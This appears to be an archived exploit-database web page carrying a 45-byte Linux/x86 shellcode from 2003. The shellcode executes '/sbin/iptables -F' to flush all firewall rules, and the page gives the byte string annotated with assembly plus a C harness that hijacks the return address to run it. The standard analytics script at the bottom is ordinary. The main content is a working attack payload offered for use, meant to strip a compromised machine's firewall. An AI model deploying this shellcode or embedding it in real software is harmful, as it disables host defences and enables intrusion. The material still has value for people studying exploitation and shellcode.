<html><head><title>Linux/x86 - iptables -F - 45 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * 06/03/2003 
 * 
 * ( 45 bytes ) to flush iptables.
 *
 * _execve(/sbin/iptables -F)  by UnboundeD
 * greetz to s0t4ipv6.
 *
 */

char shellcode[] =

&quot;\x31\xd2&quot;                      // xorl         %edx,%edx
&quot;\x52&quot;                          // pushl        %edx
&quot;\x66\x68\x2d\x46&quot;              // pushw        $0x462d
&quot;\x89\xe6&quot;                      // movl         %esp,%esi
&quot;\x52&quot;                          // pushl        %edx
&quot;\x68\x62\x6c\x65\x73&quot;          // pushl        $0x73656c62
&quot;\x68\x69\x70\x74\x61&quot;          // pushl        $0x61747069
&quot;\x89\xe7&quot;                      // movl         %esp,%edi
&quot;\x68\x62\x69\x6e\x2f&quot;          // pushl        $0x2f6e6962
&quot;\x68\x2f\x2f\x2f\x73&quot;          // pushl        $0x732f2f2f
&quot;\x89\xe3&quot;                      // movl         %esp,%ebx
&quot;\x52&quot;                          // pushl        %edx
&quot;\x56&quot;                          // pushl        %esi
&quot;\x57&quot;                          // pushl        %edi
&quot;\x89\xe1&quot;                      // movl         %esp,%ecx
&quot;\x31\xc0&quot;                      // xorl         %eax,%eax
&quot;\xb0\x0b&quot;                      // movb         $0xb,%al
&quot;\xcd\x80&quot;                      // int          $0x80
;

main() {
        int *ret;
        ret=(int *)&amp;ret +2;
        printf(&quot;Shellcode lenght=%d\n&quot;,strlen(shellcode));
        (*ret) = (int)shellcode;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
